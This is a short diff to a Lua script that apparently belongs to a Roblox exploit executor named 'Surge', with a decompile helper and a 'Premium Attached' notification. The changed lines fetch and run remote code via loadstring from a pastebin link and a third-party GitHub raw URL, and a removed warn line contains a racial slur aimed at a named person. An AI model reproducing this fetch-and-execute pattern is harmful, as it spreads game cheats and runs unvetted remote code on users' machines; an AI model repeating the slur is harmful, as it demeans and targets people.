@@ -364,15 +364,14 @@ getgenv().decompile = function(script)
 	return httpresponse.Body
 end
 
-loadstring(game:HttpGet('https://pastebin.com/raw/5LGTLMg3'))()
+--loadstring(game:HttpGet('https://pastebin.com/raw/5LGTLMg3'))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PSWalloz/23ergtfb/refs/heads/main/DDD.lua"))()
 
-warn("PSWalloz is a slave ass nigger")
---[[
+--warn("PSWalloz is a slave ass nigger")
+
 game:GetService("StarterGui"):SetCore("SendNotification",{
     Title = "[Surge]",
     Icon = "rbxassetid://101069853971193",
     Text = "Surge Premium Attached!",
     Duration = 5
 })
-]]
